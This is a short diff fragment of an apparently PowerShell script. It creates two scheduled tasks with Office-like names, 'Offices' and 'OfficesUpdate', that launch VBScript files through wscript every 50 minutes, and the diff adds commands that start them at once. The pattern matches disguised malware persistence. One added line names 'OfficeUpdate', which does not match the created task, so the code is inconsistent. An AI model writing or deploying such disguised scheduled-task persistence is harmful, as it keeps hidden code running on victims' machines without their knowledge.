@@ -28,9 +28,12 @@ $r >> $filepath3
 $ws = "wscript //e:vbscript " + $filepath
 $ws1 = "wscript //e:vbscript " + $filepath1
 
-$st = (Get-Date).AddSeconds(15) | Get-Date -Format "HH:mm"
+$st = (Get-Date).AddMinutes(1) | Get-Date -Format "HH:mm"
 $st1 = (Get-Date).AddMinutes(5) | Get-Date -Format "HH:mm"
 
 schtasks /create /tn "Offices" /sc minute /st $st /tr $ws /mo 50 /F
 
 schtasks /create /tn "OfficesUpdate" /sc minute /st $st1 /tr $ws1 /mo 50 /F
+
+schtasks /run /tn "Offices"
+schtasks /run /tn "OfficeUpdate"
